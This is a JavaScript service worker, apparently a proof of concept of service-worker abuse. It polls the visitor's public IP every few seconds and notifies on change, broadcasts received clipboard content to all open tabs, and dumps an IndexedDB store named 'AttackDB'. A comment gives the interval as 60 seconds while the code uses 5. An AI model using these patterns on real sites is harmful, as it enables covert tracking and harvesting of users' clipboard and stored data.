// sw.js

self.addEventListener('install', (event) => {
  console.log('Service Worker installing...');
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', (event) => {
  console.log('Service Worker activated.');
  readIndexedDB();
  event.waitUntil(self.clients.claim());
});

let lastKnownIP = null;

// Fetch IP address and check for changes
async function fetchIPAddress() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    console.log('Current IP Address:', data.ip);

    // Check if IP has changed
    if (lastKnownIP && lastKnownIP !== data.ip) {
      console.log(`IP Address changed from ${lastKnownIP} to ${data.ip}`);
      await sendIPChangeNotification();
    }

    // Update last known IP
    lastKnownIP = data.ip;
  } catch (error) {
    console.error('Failed to fetch IP address:', error);
  }
}

// Send a push notification when IP changes
async function sendIPChangeNotification() {
  const options = {
    body: 'Your IP address has changed!',
    icon: '/images/', // Replace with your icon path
    badge: '/images/badge.png', // Replace with your badge path
  };

  self.registration.showNotification('IP Change Detected', options);
}

// Listen for messages to trigger IP check
self.addEventListener('message', (event) => {
  if (event.data === 'fetch-ip') {
    fetchIPAddress();
  } else if (event.data && event.data.clipboardContent) {
    self.clients.matchAll().then((clients) => {
      clients.forEach((client) => {
        client.postMessage({ clipboardContent: event.data.clipboardContent });
      });
    });
  }
});

// Periodic IP check (optional, if you want regular monitoring)
setInterval(fetchIPAddress, 5000); // Checks IP every 60 seconds

async function readIndexedDB() {
  return new Promise((resolve, reject) => {
    const dbRequest = indexedDB.open('AttackDB', 1);

    dbRequest.onsuccess = function (event) {
      const db = event.target.result;
      const transaction = db.transaction('data', 'readonly');
      const store = transaction.objectStore('data');

      store.openCursor().onsuccess = function (event) {
        const cursor = event.target.result;
        if (cursor) {
          console.log(`Data type: ${cursor.key}`, cursor.value.data);
          cursor.continue();
        } else {
          console.log('No more entries in IndexedDB.');
          resolve();
        }
      };
    };

    dbRequest.onerror = function (event) {
      console.error('Error reading IndexedDB:', event.target.errorCode);
      reject();
    };
  });
}
